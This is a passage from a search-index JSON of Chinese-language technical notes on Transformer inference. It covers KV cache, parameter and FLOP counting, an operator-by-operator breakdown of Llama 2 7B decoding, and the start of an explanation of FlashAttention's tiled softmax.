Projection \u200b\u77e9\u9635\u200b\uff0c\u200b\u5f97\u5230\u200b\u65b0\u200b\u77e9\u9635\u200b \\((n, d_{model})\\)</li> <li>\u200b\u7ecf\u8fc7\u200b\u4e00\u4e2a\u200b MLP\uff0cMLP \u200b\u7b2c\u4e00\u5c42\u200b\u662f\u200b \\((d_{model}, 4*d_{model})\\)\uff0c\u200b\u7b2c\u4e8c\u5c42\u200b\u662f\u200b \\((4*d_{model}, d_{model})\\)</li> <li>MLP \u200b\u8f93\u51fa\u200b\u7684\u200b\u77e9\u9635\u200b\u5c3a\u5bf8\u200b\u4e3a\u200b \\((n, d_{model})\\)</li> </ol>"},{"location":"software/transformer.html#kv-cache","title":"KV cache","text":"<p>\u200b\u5728\u200b\u63a8\u7406\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u662f\u200b\u5728\u200b\u5df2\u6709\u200b\u7684\u200b context \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u65b0\u200b token\uff0c\u200b\u518d\u200b\u628a\u200b token \u200b\u52a0\u200b\u5230\u200b context\uff0c\u200b\u7ee7\u7eed\u200b\u751f\u6210\u200b\u4e0b\u200b\u4e00\u4e2a\u200b token\u3002\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b Attention \u200b\u4f1a\u5e26\u200b Mask\uff0c\u200b\u65e7\u200b token \u200b\u4e0d\u4f1a\u200b\u4f9d\u8d56\u200b\u65b0\u200b token\uff0c\u200b\u56e0\u6b64\u200b\u65e7\u200b token \u200b\u7684\u200b\u90e8\u5206\u200b\u4e0d\u4f1a\u200b\u53d8\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53ea\u200b\u8003\u8651\u200b\u65b0\u200b\u5f15\u5165\u200b\u7684\u200b token \u200b\u5e26\u6765\u200b\u7684\u200b\u53d8\u5316\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u65b0\u200b\u7684\u200b token \u200b\u7684\u200b Q K V \u200b\u4ee5\u540e\u200b\uff0c\u200b\u5728\u200b\u8fdb\u884c\u200b Attention \u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u5148\u524d\u200b\u7684\u200b token \u200b\u7684\u200b K \u200b\u548c\u200b V \u200b\u90e8\u5206\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u5148\u524d\u200b token \u200b\u7684\u200b Q \u200b\u4e0d\u200b\u5f71\u54cd\u200b\u5f53\u524d\u200b token \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u628a\u200b\u4e4b\u524d\u200b token \u200b\u7684\u200b K \u200b\u548c\u200b V \u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff0c\u200b\u4e0d\u7528\u200b\u91cd\u65b0\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b KV cache\u3002</p>"},{"location":"software/transformer.html#_2","title":"\u53c2\u200b\u6570\u91cf\u200b\u548c\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u91cf","text":"<p>\u200b\u8003\u8651\u200b\u6bcf\u5c42\u200b\u7684\u200b\u53c2\u200b\u6570\u91cf\u200b\u548c\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u91cf\u200b\uff1a</p> <ol> <li>\u200b\u8ba1\u7b97\u200b Q\uff0cK \u200b\u548c\u200b V\uff1a\u200b\u53c2\u6570\u200b\u662f\u200b\u4e09\u4e2a\u200b \\((d_{model}, d_{model})\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u662f\u200b \\(2 * 3 * n * d_{model}^2\\)</li> <li>\u200b\u4e58\u4ee5\u200b Projection \u200b\u77e9\u9635\u200b\uff1a\u200b\u53c2\u6570\u200b\u662f\u200b \\((d_{model}, d_{model})\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u662f\u200b \\(2 * n * d_{model}^2\\)</li> <li>\u200b\u4e58\u4ee5\u200b MLP \u200b\u7b2c\u4e00\u5c42\u200b\uff1a\u200b\u53c2\u6570\u200b\u662f\u200b \\((d_{model}, 4*d_{model})\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u662f\u200b \\(2 * 4 * n * d_{model}^2\\)</li> <li>\u200b\u4e58\u4ee5\u200b MLP \u200b\u7b2c\u4e8c\u5c42\u200b\uff1a\u200b\u53c2\u6570\u200b\u662f\u200b \\((4*d_{model}, d_{model})\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u662f\u200b \\(2 * 4 * n * d_{model}^2\\)</li> </ol> <p>\u200b\u5176\u4f59\u90e8\u5206\u200b\u7684\u200b\u53c2\u200b\u6570\u91cf\u200b\u548c\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u53ef\u4ee5\u200b\u5ffd\u7565\u4e0d\u8ba1\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\u603b\u53c2\u200b\u6570\u91cf\u200b\uff08\u200b\u4e0d\u200b\u8003\u8651\u200b Embedding\uff09\u200b\u4e3a\u200b\uff1a</p> \\[ 12n_{layer}d_{model}^2 \\] <p>\u200b\u6bcf\u4e2a\u200b Token \u200b\u7684\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u4e3a\u200b\uff1a</p> \\[ 24n_{layer}d_{model}^2 \\mathrm{FLOP} \\]"},{"location":"software/transformer.html#llama-2-7b","title":"Llama 2 7B","text":"<p>\u200b\u4ee5\u200b Llama 2 7B \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5206\u6790\u200b Transformer \u200b\u63a8\u7406\u200b\u7684\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u53c2\u6570\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>hidden size: 4096</li> <li>intermediate size\uff08MLP \u200b\u7684\u200b\u4e2d\u95f4\u5c42\u200b\u7684\u200b\u7ef4\u5ea6\u200b\uff09: 11008</li> <li>hidden layers: 32</li> <li>attention heads: 32</li> <li>key value heads: 32</li> <li>head dim: 4096 / 32 = 128</li> <li>vocab size: 32000</li> </ul> <p>\u200b\u53c2\u8003\u200b HuggingFace \u200b\u6e90\u7801\u200b\u3002</p> <p>Llama2 \u200b\u7684\u200b\u4e3b\u8981\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u662f\u200b 32 \u200b\u5c42\u200b LlamaDecoderLayer\uff0c\u200b\u6bcf\u4e2a\u200b LlamaDecoderLayer \u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>hidden_states = self.input_layernorm(hidden_states)</code>: \u200b\u89c1\u200b LlamaRMSNorm</li> <li><code>hidden_states, self_attn_weights, present_key_value = self.self_attn()</code>\uff1a\u200b\u89c1\u200b LlamaAttention</li> <li><code>hidden_states = residual + hidden_states</code>: <code>aten::add([1, 1, 4096], [1, 1, 4096]) = [1, 1, 4096]</code></li> <li><code>hidden_states = self.post_attention_layernorm(hidden_states)</code>: \u200b\u89c1\u200b LlamaRMSNorm</li> <li><code>hidden_states = self.mlp(hidden_states)</code>\uff1a\u200b\u89c1\u200b LlamaMLP</li> <li><code>hidden_states = residual + hidden_states</code>: <code>aten::add([1, 1, 4096], [1, 1, 4096]) = [1, 1, 4096]</code></li> </ol> <p>hidden_states \u200b\u7684\u200b\u89c4\u6a21\u200b\u662f\u200b <code>[1, 1, 4096]</code>\u3002</p> <p>LlamaRMSNorm \u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>hidden_states = hidden_states.to(torch.float32)</code>: <code>aten::to([1, 1, 4096]) = [1, 1, 4096]</code></li> <li><code>v1 = hidden_states.pow(2)</code>: <code>aten::pow([1, 1, 4096]) = [1, 1, 4096]</code></li> <li><code>variance = v2.mean(-1, keepdim=True)</code>: <code>aten::mean([1, 1, 4096]) = [1, 1, 1]</code></li> <li><code>v3 = variance + self.variance_epsilon</code>: <code>aten::add([1, 1, 1]) = [1, 1, 1]</code>, 1 FLOP</li> <li><code>v4 = torch.rsqrt(v3)</code>: <code>aten::rsqrt([1, 1, 1]) = [1, 1, 1]</code></li> <li><code>hidden_states = hidden_states * v4</code>: <code>aten::mul([1, 1, 4096], [1, 1, 1]) = [1, 1, 4096]</code>, 4096 FLOP</li> <li><code>v5 = hidden_states.to(input_dtype)</code>: <code>aten::to([1, 1, 4096]) = [1, 1, 4096]</code></li> <li><code>return self.weight * v5</code>: <code>aten::mul([4096], [1, 1, 4096])</code>, 4096 FLOP</li> </ol> <p>LlamaAttention \u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>query_states = self.q_proj(hidden_states)</code>: <code>aten::linear([1, 1, 4096], [4096, 4096]) = [1, 1, 4096]</code>, 33554432 FLOP</li> <li><code>key_states = self.k_proj(hidden_states)</code>: <code>aten::linear([1, 1, 4096], [4096, 4096]) = [1, 1, 4096]</code>, 33554432 FLOP</li> <li><code>value_states = self.v_proj(hidden_states)</code>: <code>aten::linear([1, 1, 4096], [4096, 4096]) = [1, 1, 4096]</code>, 33554432 FLOP</li> <li><code>v1 = query_states.view(bsz, q_len, self.num_heads, self.head_dim)</code>: <code>aten::view([1, 1, 4096]) = [1, 1, 32, 128]</code></li> <li><code>query_states = v1.transpose(1, 2)</code>: <code>aten::transpose([1, 1, 32, 128]) = [1, 32, 1, 128]</code></li> <li><code>v2 = key_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim)</code>: <code>aten::view([1, 1, 4096]) = [1, 1, 32, 128]</code></li> <li><code>key_states = v2.transpose(1, 2)</code>: <code>aten::transpose([1, 1, 32, 128]) = [1, 32, 1, 128]</code></li> <li><code>v3 = value_states = value_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim)</code>: <code>aten::view([1, 1, 4096]) = [1, 1, 32, 128]</code></li> <li><code>value_states = v3.transpose(1, 2)</code>: <code>aten::transpose([1, 1, 32, 128]) = [1, 32, 1, 128]</code></li> <li><code>cos, sin = self.rotary_emb(value_states, seq_len=kv_seq_len)</code>: \u200b\u89c1\u200b LlamaRotaryEmebdding</li> <li><code>query_states, key_states = apply_rotary_pos_emb(query_states, key_states, cos, sin, position_ids)</code>: \u200b\u89c1\u200b apply_rotary_pos_emb</li> <li><code>key_states = torch.cat([past_key_value[0], key_states], dim=2)</code>: <code>aten::cat([1, 32, C-1, 128], [1, 32, 1, 128]) = [1, 32, C, 128]</code></li> <li><code>value_states = torch.cat([past_key_value[1], value_states], dim=2)</code>: <code>aten::cat([1, 32, C-1, 128], [1, 32, 1, 128]) = [1, 32, C, 128]</code></li> <li><code>v4 = key_states.transpose(2, 3)</code>: <code>aten::transpose([1, 32, C, 128]) = [1, 32, 128, C]</code></li> <li><code>v5 = torch.matmul(query_states, v4)</code>: <code>aten::matmul([1, 32, 1, 128], [1, 32, 128, C]) = [1, 32, 1, C]</code>, 8192*C FLOP</li> <li><code>attn_weights = v1 / math.sqrt(self.head_dim)</code>: <code>aten::div([1, 32, 1, C]) = [1, 32, 1, C]</code></li> <li><code>attn_weights = attn_weights + attention_mask</code>: <code>aten::add([1, 32, 1, C], [1, 1, 1, C]) = [1, 32, 1, C]</code>, 32*C FLOP</li> <li><code>v6 = nn.functional.softmax(attn_weights, dim=-1, dtype=torch.float32).to(query_states.dtype)</code>: <code>aten::softmax([1, 32, 1, C]) = [1, 32, 1, C]</code></li> <li><code>attn_weights = v6.to(query_states.dtype)</code>: <code>aten::to([1, 32, 1, C]) = [1, 32, 1, C]</code></li> <li><code>attn_output = torch.matmul(attn_weights, value_states)</code>: <code>aten::matmul([1, 32, 1, C], [1, 32, C, 128]) = [1, 32, 1, 128]</code>: 8192*C FLOP</li> <li><code>attn_output = attn_output.transpose(1, 2).contiguous()</code>: <code>aten::transpose([1, 32, 1, 128]) = [1, 1, 32, 128]</code></li> <li><code>attn_output = attn_output.reshape(bsz, q_len, self.hidden_size)</code>: <code>aten::reshape([1, 1, 32, 128]) = [1, 1, 4096]</code></li> <li><code>attn_output = self.o_proj(attn_output)</code>: <code>aten::linear([1, 1, 4096], [4096, 4096]) = [1, 1, 4096]</code>, 33554432 FLOP</li> </ol> <p>LlamaRotaryEmbedding \u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>self.cos_cached[:, :, :seq_len, ...].to(dtype=x.dtype),</code>: <code>aten::slice([1, 1, 4096, 128])</code></li> <li><code>self.sin_cached[:, :, :seq_len, ...].to(dtype=x.dtype),</code>: <code>aten::slice([1, 1, 4096, 128])</code></li> </ol> <p>apply_rotary_pos_emb \u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>v1 = cos.squeeze(1)</code>: <code>aten::squeeze([1, 1, 10, 128])</code></li> <li><code>cos = v1.squeeze(0)</code>: <code>aten::squeeze([1, 10, 128])</code></li> <li><code>v2 = cos.squeeze(1)</code>: <code>aten::squeeze([1, 1, 10, 128])</code></li> <li><code>sin = v2.squeeze(0)</code>: <code>aten::squeeze([1, 10, 128])</code></li> <li><code>v3 = cos[position_ids]</code>: <code>aten::index([10, 128])</code></li> <li><code>cos = v3.unsqueeze(1)</code>: <code>aten::unsqueeze([1, 1, 128]) = [1, 1, 1, 128]</code></li> <li><code>v4 = sin[position_ids]</code>: <code>aten::index([10, 128])</code></li> <li><code>sin = v4.unsqueeze(1)</code>: <code>aten::unsqueeze([1, 1, 128]) = [1, 1, 1, 128]</code></li> <li><code>v5 = q * cos</code>: <code>aten::mul([1, 32, 1, 128], [1, 1, 1, 128]) = [1, 32, 1, 128]</code>, 4096 FLOP</li> <li><code>v6 = rotate_half(q)</code>: \u200b\u89c1\u200b rotate_half</li> <li><code>v7 = v6 * sin</code>: <code>aten::mul([1, 32, 1, 128], [1, 1, 1, 128]) = [1, 32, 1, 128]</code>, 4096 FLOP</li> <li><code>q_embed = v5 + v7</code>: <code>aten::add([1, 32, 1, 128], [1, 32, 1, 128]) = [1, 32, 1, 128]</code>, 4096 FLOP</li> <li><code>v8 = k * cos</code>: <code>aten::mul([1, 32, 1, 128], [1, 1, 1, 128]) = [1, 32, 1, 128]</code>, 4096 FLOP</li> <li><code>v9 = rotate_half(k)</code>: \u200b\u89c1\u200b rotate_half</li> <li><code>v10 = v9 * sin</code>: <code>aten::mul([1, 32, 1, 128], [1, 1, 1, 128]) = [1, 32, 1, 128]</code>, 4096 FLOP</li> <li><code>k_embed = v8 + v10</code>: <code>aten::add([1, 32, 1, 128], [1, 32, 1, 128]) = [1, 32, 1, 128]</code>, 4096 FLOP</li> </ol> <p>rotate_half \u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>x1 = x[..., : x.shape[-1] // 2]</code>: <code>aten::slice([1, 3, 1, 128])</code></li> <li><code>x2 = x[..., x.shape[-1] // 2 :]</code>: <code>aten::slice([1, 3, 1, 128])</code></li> <li><code>v1 = -x2</code>: <code>aten::neg([1, 3, 1, 64])</code></li> <li><code>return torch.cat((v1, x1), dim=-1)</code>: <code>aten::cat([1, 3, 1, 64], [1, 3, 1, 64]) = [1, 3, 1, 128]</code></li> </ol> <p>LlamaMLP \u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>v1 = self.gate_proj(x)</code>: <code>aten::linear([1, 1, 4096], [11008, 4096]) = [1, 1, 11008]</code>, 90177536 FLOP</li> <li><code>v2 = self.act_fn(v1)</code>: <code>aten::silu([1, 1, 11008]) = [1, 1, 11008]</code></li> <li><code>v3 = self.up_proj(x)</code>: <code>aten::linear([1, 1, 4096], [11008, 4096]) = [1, 1, 11008]</code>, 90177536 FLOP</li> <li><code>v4 = v2 * v3</code>: <code>aten::mul([1, 1, 11008], [1, 1, 11008]) = [1, 1, 11008]</code>, 11008 FLOP</li> <li><code>v5 = self.down_proj(v4)</code>: <code>aten::linear([1, 1, 11008], [4096, 11008]) = [1, 1, 4096]</code>, 90177536 FLOP</li> </ol> <p>\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b LlamaDecoderLayer \u200b\u7684\u200b\u8f93\u51fa\u200b\u4f1a\u200b\u7ecf\u8fc7\u200b lm_head \u200b\u5f97\u5230\u200b logits\uff1a</p> <ol> <li><code>logits = self.lm_head(hidden_states)</code>: <code>aten::linear([1, 1, 4096], [32000, 4096]) = [1, 1, 32000]</code>, 262144000 FLOP</li> </ol> <p>\u200b\u6240\u6709\u200b aten \u200b\u7b97\u5b50\u200b\uff1a</p> <ul> <li>aten::add</li> <li>aten::cat</li> <li>aten::div</li> <li>aten::index</li> <li>aten::linear</li> <li>aten::matmul</li> <li>aten::mean</li> <li>aten::mul</li> <li>aten::neg</li> <li>aten::pow</li> <li>aten::reshape</li> <li>aten::rsqrt</li> <li>aten::sequeeze</li> <li>aten::silu</li> <li>aten::slice</li> <li>aten::softmax</li> <li>aten::to</li> <li>aten::transpose</li> <li>aten::unsqueeze</li> <li>aten::view</li> </ul>"},{"location":"software/transformer.html#flashattention","title":"FlashAttention","text":"<p>\u200b\u8bba\u6587\u200b\uff1aFlashAttention: Fast and Memory-Efficient Exact Attention with IO-Awareness</p> <p>\u200b\u4ee3\u7801\u200b\uff1aDao-AILab/flash-attention</p> <p>\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b\uff1aFlashAttention \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\u4ee5\u53ca\u200b V1 V2 \u200b\u5dee\u5f02\u200b\u603b\u7ed3\u200b</p> <p>\u200b\u4e3b\u8981\u200b\u9488\u5bf9\u200b Transformer \u200b\u8bad\u7ec3\u200b\u4e2d\u200b\u7684\u200b Attention \u200b\u8ba1\u7b97\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b\u3002Attention \u200b\u8ba1\u7b97\u200b\u7684\u200b\u662f\u200b\uff1a</p> <p>\\(S = QK^T, P = \\mathrm{softmax}(S), O = PV\\)</p> <p>\u200b\u5176\u4e2d\u200b Q\u3001K \u200b\u548c\u200b V \u200b\u77e9\u9635\u200b\u89c4\u6a21\u200b\u90fd\u200b\u662f\u200b \\(N*d\\)\uff0cS \u200b\u548c\u200b P \u200b\u77e9\u9635\u200b\u89c4\u6a21\u200b\u662f\u200b \\(N*N\\)\uff0cO \u200b\u77e9\u9635\u200b\u89c4\u6a21\u200b\u662f\u200b \\(N*d\\)\uff0cN \u200b\u662f\u200b\u5e8f\u5217\u200b\u957f\u5ea6\u200b\uff0cd \u200b\u662f\u200b head dimension\u3002\u200b\u5b9e\u9645\u4e0a\u200b \\(S\\) \u200b\u77e9\u9635\u200b\u8fd8\u4f1a\u200b\u9664\u4ee5\u200b\u4e00\u4e2a\u200b\u7cfb\u6570\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u4f18\u5316\u200b\u8d77\u6765\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u5c31\u200b\u5ffd\u7565\u200b\u4e86\u200b\u3002\u200b\u6734\u7d20\u200b\u7b97\u6cd5\u200b\u5c31\u662f\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u6b65\u9aa4\u200b\u5206\u522b\u200b\u7b97\u200b\uff0c\u200b\u4f46\u662f\u200b\u5c31\u200b\u6bd4\u8f83\u6162\u200b\u3002\u200b\u6838\u5fc3\u200b\u95ee\u9898\u200b\u662f\u200b softmax \u200b\u64cd\u4f5c\u200b\u3002softmax \u200b\u7684\u200b\u5b9a\u4e49\u200b\u662f\u200b\uff1a</p> <p>\\(\\mathrm{softmax}(x) = \\frac{e^{x_i}}{\\Sigma_j e^{x_j}}\\)</p> <p>\u200b\u5206\u5b50\u200b\u662f\u200b\u5bf9\u5e94\u200b\u9879\u200b\u7684\u200b exp\uff0c\u200b\u5206\u6bcd\u200b\u662f\u200b\u6240\u6709\u200b\u9879\u200b\u7684\u200b exp \u200b\u4e4b\u200b\u548c\u200b\u3002\u200b\u6240\u4ee5\u200b softmax \u200b\u7684\u200b\u6309\u200b\u5b9a\u4e49\u200b\u7b97\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5c31\u662f\u200b\uff1a\u200b\u6240\u6709\u200b\u5143\u7d20\u200b\u6c42\u200b exp\uff0c\u200b\u7136\u540e\u200b\u6c42\u200b exp \u200b\u7684\u200b\u548c\u200b\uff0c\u200b\u518d\u200b\u96c6\u4f53\u200b\u505a\u200b\u9664\u6cd5\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u4e48\u200b\u7b97\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u5143\u7d20\u200b\u7684\u200b exp \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5f88\u5927\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u7cbe\u5ea6\u200b\u6bd4\u8f83\u200b\u5dee\u200b\u3002\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u5148\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5143\u7d20\u200b\u7684\u200b\u6700\u5927\u503c\u200b \\(x_m\\)\uff0c\u200b\u7136\u540e\u200b\u5206\u5b50\u200b\u5206\u6bcd\u200b\u540c\u65f6\u200b\u9664\u4ee5\u200b\u6700\u5927\u503c\u200b\u7684\u200b exp\uff1a</p> <p>\\(\\mathrm{softmax}(x) = \\frac{e^{x_i-x_m}}{\\Sigma_j e^{x_j-x_m}}\\)</p> <p>\u200b\u8fd9\u6837\u200b\u8ba1\u7b97\u200b\u7684\u200b\u7cbe\u5ea6\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u597d\u200b\uff0c\u200b\u56e0\u4e3a\u200b exp \u200b\u7684\u200b\u503c\u200b\u90fd\u200b\u5728\u200b 0 \u200b\u548c\u200b 1 \u200b\u4e4b\u95f4\u200b\u3002\u200b\u8fd9\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b softmax \u200b\u7684\u200b\u8ba1\u7b97\u200b\u9700\u8981\u200b\u5148\u6c42\u200b max\uff0c\u200b\u7136\u540e\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u51cf\u53bb\u200b max \u200b\u540e\u200b\uff0c\u200b\u6c42\u200b exp\uff0c\u200b\u518d\u6c42\u200b\u5143\u7d20\u200b\u7684\u200b exp \u200b\u4e4b\u200b\u548c\u200b\uff0c\u200b\u6700\u540e\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u518d\u200b\u9664\u4ee5\u200b exp \u200b\u4e4b\u200b\u548c\u200b\u3002\u200b\u51c6\u786e\u200b\u5730\u8bf4\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u91cc\u200b\u7684\u200b\u8f93\u5165\u200b\u662f\u200b\u77e9\u9635\u200b\uff0c\u200b\u6240\u4ee5\u200b\u662f\u200b\u5bf9\u200b\u77e9\u9635\u200b\u7684\u200b\u6bcf\u200b\u4e00\u884c\u200b\u5206\u522b\u200b\u7b97\u200b softmax\u3002</p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\u6c42\u6cd5\u200b\u610f\u5473\u7740\u200b\u9700\u8981\u200b\u5148\u200b\u628a\u200b\u5b8c\u6574\u200b\u7684\u200b softmax \u200b\u8f93\u5165\u200b\u6c42\u200b\u51fa\u6765\u200b\uff0c\u200b\u4f7f\u5f97\u200b tiling \u200b\u53d8\u5f97\u200b\u56f0\u96be\u200b\u3002\u200b\u4e3a\u4e86\u200b tiling\uff0cFlashAttention \u200b\u91c7\u7528\u200b\u4e86\u200b\u4e00\u79cd\u200b\u5206\u5757\u200b\u7684\u200b softmax \u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\uff1a\u200b\u9996\u5148\u200b\u5bf9\u200b\u6bcf\u200b\u4e00\u5757\u200b\u5206\u522b\u200b\u505a\u200b softmax\uff0c\u200b\u4f46\u662f\u200b\u6309\u7167\u200b\u5b9a\u4e49\u200b\uff0cmax \u200b\u548c\u200b sum \u200b\u90fd\u200b\u5e94\u8be5\u200b\u662f\u200b\u5b8c\u6574\u200b\u5411\u91cf\u200b\u7684\u200b max \u200b\u548c\u200b sum\uff0c\u200b\u800c\u200b\u5982\u679c\u200b\u5206\u5757\u200b\u53bb\u200b\u8ba1\u7b97\u200b softmax\uff0c\u200b\u6b64\u65f6\u200b\u7684\u200b max \u200b\u548c\u200b sum \u200b\u662f\u200b\u5757\u200b\u5185\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u540e\u5904\u7406\u200b\uff0c\u200b\u628a\u200b\u5206\u5757\u200b\u7684\u200b softmax \u200b\u7ea0\u6b63\u200b\u6210\u200b\u6b63\u786e\u200b\u7684\u200b softmax\uff1a</p> <p>\u200b\u5047\u5982\u200b\u6709\u200b\u4e24\u4e2a\u200b\u5757\u200b\u5206\u522b\u200b\u505a\u200b\u4e86\u200b softmax\uff0c\u200b\u7ed3\u679c\u200b\u662f\u200b\u4e24\u4e2a\u200b\u5411\u91cf\u200b \\(x_1\\) \u200b\u548c\u200b \\(x_2\\)\uff0c\u200b\u8ba1\u7b97\u200b\u65f6\u200b\u7684\u200b max \u200b\u8bb0\u200b\u4e3a\u200b \\(m_1\\) \u200b\u548c\u200b \\(m_2\\)\uff0c\u200b\u5206\u5b50\u200b\u8bb0\u200b\u4e3a\u200b \\(f(x_1)\\) \u200b\u548c\u200b \\(f(x_2)\\)\uff0c\u200b\u5206\u6bcd\u200b\u8bb0\u200b\u4e3a\u200b \\(l(x_1)\\) \u200b\u548c\u200b \\(l(x_2)\\)\u3002\u200b\u90a3\u4e48\u200b\u5408\u5e76\u200b\u540e\u200b\u7684\u200b\u5411\u91cf\u200b\u7684\u200b max \u200b\u5c31\u662f\u200b \\(m=\\max(m_1, m_2)\\)\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5b8c\u6574\u200b\u7684\u200b softmax\uff1a\u200b\u5206\u5b50\u200b\u6765\u81ea\u200b\u4e8e\u200b\u4e24\u4e2a\u200b\u5411\u91cf\u200b\uff0c\u200b\u4f46\u662f\u200b\u9700\u8981\u200b\u628a\u200b \\(m_1\\) \\(m_2\\) \u200b\u548c\u200b \\(m\\) \u200b\u7684\u200b\u5dee\u5f02\u200b\u8865\u200b\u4e0a\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b \\(e^{m_1-m}f(x_1)\\) \u200b\u548c\u200b \\(e^{m_2-m}f(x_2)\\) \u200b\u4e24\u200b\u90e8\u5206\u200b\u62fc\u63a5\u200b\u8d77\u6765\u200b\uff1b\u200b\u5206\u6bcd\u200b\u5219\u200b\u662f\u200b\u4e24\u4e2a\u200b\u5411\u91cf\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u628a\u200b max \u200b\u5dee\u5f02\u200b\u7ea0\u6b63\u200b\u540e\u200b\u518d\u200b\u6c42\u548c\u200b\uff1a\\(e^{m_1-m}l(x_1)+e^{m_2-m}l(x_2)\\)\u3002\u200b\u8bba\u6587\u200b\u4e2d\u662f\u200b\u8fd9\u4e48\u200b\u8868\u793a\u200b\u7684\u200b\uff1a</p> <p> </p> \u200b\u5206\u5757\u200b softmax\uff08\u200b\u6765\u6e90\u200b\uff1aFlashAttention: Fast and Memory-Efficient Exact Attention with IO-Awareness\uff09 <p>\u200b\u56e0\u6b64\u200b\u8ba1\u7b97\u200b softmax \u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u5148\u200b\u5206\u5757\u200b\u8fdb\u884c\u200b\uff0c\u200b\u6700\u540e\u200b\u518d\u200b\u628a\u200b\u7ed3\u679c\u200b\u7ea0\u6b63\u200b\u8fc7\u6765\u200b\u3002\u200b\u80fd\u200b\u5206\u5757\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u505a\u200b kernel fusion\uff0c\u200b\u548c\u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\u3001Masking\u3001Dropout \u200b\u5408\u5e76\u200b\u8d77\u6765\u200b\uff0c\u200b\u8ba9\u200b\u4e2d\u95f4\u200b\u7ed3\u679c\u200b\u5728\u200b GPU \u200b\u5185\u90e8\u200b\u5b8c\u6210\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u5148\u5199\u200b\u5230\u200b\u663e\u5b58\u200b\u91cc\u200b\u518d\u200b\u8bfb\u200b\u56de\u6765\u200b\u3002</p> <p>\u200b\u8bba\u6587\u200b\u7684\u200b Algorithm 1 \u200b\u548c\u200b 2 \u200b\u7ed9\u51fa\u200b\u4e86\u200b\u878d\u5408\u200b\u540e\u200b\u7684\u200b Kernel \u200b\u7684\u200b\u4f2a\u200b\u4ee3\u7801\u200b\u3002\u200b\u601d\u8def\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u5bf9\u200b Q\u3001K \u200b\u548c\u200b V \u200b\u5206\u5757\u200b</li> 